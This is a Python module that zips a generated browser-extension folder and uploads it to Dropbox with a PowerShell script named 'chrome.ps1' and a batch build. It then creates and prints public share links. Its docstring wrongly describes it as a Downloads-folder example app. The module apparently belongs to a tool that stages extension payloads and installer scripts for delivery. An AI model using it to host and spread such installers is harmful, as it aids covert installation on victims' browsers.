#!/usr/bin/python


"""Upload the contents of your Downloads folder to Dropbox.
This is an example app for API v2.
"""

import os
import dropbox
from dropbox.exceptions import ApiError
import zipfile
import datetime
import time
from colors import Colors
import shutil
import build

class Drive :

	def __init__(self, extension, token) :
		self.extension = extension
		self.token = token
		self.color = Colors()
		self.drive = dropbox.Dropbox(self.token)

	def upload(self) :

		if not os.path.exists("output/extensions/tmp"):
				os.mkdir("output/extensions/tmp")

		path = "/{}".format(self.extension)

		directory = "output/extensions/{}".format(self.extension)
		zipile = "output/extensions/tmp/{}{}".format(self.extension, ".zip")
		batch = "output/builds/{}{}".format(self.extension, ".bat")
		powershell = "output/builds/{}{}".format("chrome", ".ps1")

		if not os.path.exists(zipile):
			for dirname, subdirs, files in os.walk(directory):
				zf = zipfile.ZipFile(zipile, "a", zipfile.ZIP_DEFLATED)
				for filename in files:
						zf.write(os.path.join(dirname, filename))
				zf.close()

		overwrite = True
		
		if overwrite:
			mode = dropbox.files.WriteMode.overwrite
		else:
			mode = dropbox.files.WriteMode.add

		mtime = os.path.getmtime(zipile)
		ctime = datetime.datetime(*time.gmtime(mtime)[:6])

		try:

			print('{} Upload .zip file in dropbox'.format(self.color.status("[+]")))

			for dirname, subdirs, files in os.walk(directory):
				with open(zipile, "rb") as f :
					data = f.read()
					try:
						self.drive.files_upload(data, "{}/{}{}".format(path, self.extension, ".zip"), mode=mode, client_modified=ctime, mute=True)
					except dropbox.exceptions.ApiError as e:
						return None
				f.close()
		except Exception as e:
			raise e

		build.Build(self.extension, "bat", self.token).builder()

		try:

			print('{} Upload .ps1 file in dropbox'.format(self.color.status("[+]")))
			with open(powershell, "rb") as pwsh :
				data = pwsh.read()
				try:
					self.drive.files_upload(data, "{}/{}{}".format(path, self.extension, ".ps1"), mode=mode, client_modified=ctime, mute=True)
				except dropbox.exceptions.ApiError as e:
					return None
			pwsh.close()
		except Exception as e:
			raise e

		paths = self.drive.files_list_folder("/{}".format(self.extension))

		shareds = []

		for e, file in enumerate(paths.entries) :
			
			try:
				create = self.drive.sharing_create_shared_link(file.path_lower)
			except ApiError as err:
				if err.error.is_shared_link_already_exists() :
					print("{} Link already exists zip".format(self.color.error("[!]")))
			try:
				shared = self.drive.sharing_get_shared_links(file.path_lower)
				for links in shared.links :
					shareds.append(links.url)
			except Exception as e:
				raise e
		print(shareds)


		print('{} The file has been uploaded on https://www.dropbox.com/home{}'.format(self.color.status("[+]"), "{}/{}{}".format(path, self.extension, ".zip")))	
		
		if os.path.exists("output/extensions/tmp"):
				shutil.rmtree("output/extensions/tmp")
